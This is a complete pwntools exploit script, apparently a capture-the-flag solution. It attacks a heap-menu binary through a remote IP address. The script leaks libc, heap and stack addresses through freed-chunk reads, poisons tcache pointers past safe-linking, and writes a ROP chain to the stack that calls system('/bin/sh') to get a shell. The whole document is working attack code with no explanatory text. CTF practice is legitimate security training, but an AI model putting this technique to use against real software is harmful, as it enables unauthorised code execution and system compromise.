#!/usr/bin/python3
from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b*0x555555555E73  

                c
                ''')
                input()
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('3.75.185.198', 2000)
else:
        p = process(exe.path)

GDB()

def create(x,y,w,h, content):
    sla(b'> ', '1')
    sla(b': ', str(x))
    sla(b': ', str(y))
    sla(b': ', str(w))
    sla(b': ', str(h))
    sla(b': ', str(1))
    sa(b': ', content)
def select(x,y):
    sla(b'> ', '3')    
    sla(b': ', str(x))
    sla(b': ', str(y))   
def delete(x,y):
    sla(b'> ', '2')
    sla(b': ', str(x))
    sla(b': ', str(y))

def edit(content):
    sla(b'> ', '4')
    sla(b': ', content)

def show():
    sla(b'> ', '5')
    p.recvuntil(b'Box content:\n')
for i in range(9):  
    create(0,0+i,4,0x20, b'ab')
for i in range(7):  
    select(0,0+i)
    delete(0,0+i)
select(0,0+7)
delete(0,0+7)
show()
tmp = p.recv(8).split(b'\n')
libc.address = u64((tmp[0] + tmp[1]).ljust(8, b'\0')) - 0x219ce0
info("libc: " + hex(libc.address))
for i in range(8):  
    create(0,0+i,4,0x20, b'ab')
select(0,0+i)
delete(0,0+i)
show()
tmp = p.recv(8).split(b'\n')
heap = u64((tmp[0] + tmp[1]).ljust(8, b'\0'))
heap = heap << 12
info("heap: " + hex(heap))

for i in range(6):
    select(0,0+i)
    delete(0,0+i)   
create(0,2,2,0x18, p64(0)) # 0x55555555d370 —▸ 0x55555555d440
create(0,3,2,0x18, p64(0)) # 0x55555555d510 —▸ 0x55555555d5e0 
create(0,4,2,0x18, p64(0x5b1b006d31335b1b)) # 0x55555555d6b0 —▸ 0x55555555d780
select(0,0+4)
delete(0,0+4)   
edit(flat((heap+0x370)^(heap+0x780)>>12 ))
create(0,4,3,0x18, p64(0x5b1b006d31335b1b)) # 0x55555555d6b0 —▸ 0x55555555d780
create(0,5,2,0x18, flat(0,2,(heap+0x440),0x2,0x18, libc.sym.environ )) # 0x55555555d6b0 —▸ 0x55555555d780
select(0,0+2)
show()
tmp = p.recv(8).split(b'\n')
stack = u64((tmp[0] + tmp[1]+tmp[2]).ljust(8, b'\0')) - 0x128
info("stack: " + hex(stack)) # 0x7fffffffd970
create(0,0+10,2,0x18, b'ab')
create(0,0+11,2,0x18, b'ab')
select(0,0+10)
delete(0,0+10)
select(0,0+11)
delete(0,0+11) 
edit(flat(stack^(heap + 0xb00)>> 12))
create(0,0+10,3,0x18, b'ab')
rop = ROP(libc)

create(0,0+11,2,0x18, flat(
    0, rop.find_gadget(['pop rdi', 'ret']).address+1,
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
))


# 0x55555555d6b0 0x55555555d780


# edit(p64((heap+0x440+0x10) ^ (heap+0x960) >> 12))

# edit(p64((heap+0x440+0x10) ^ (heap+0x960) >> 12))

p.interactive()
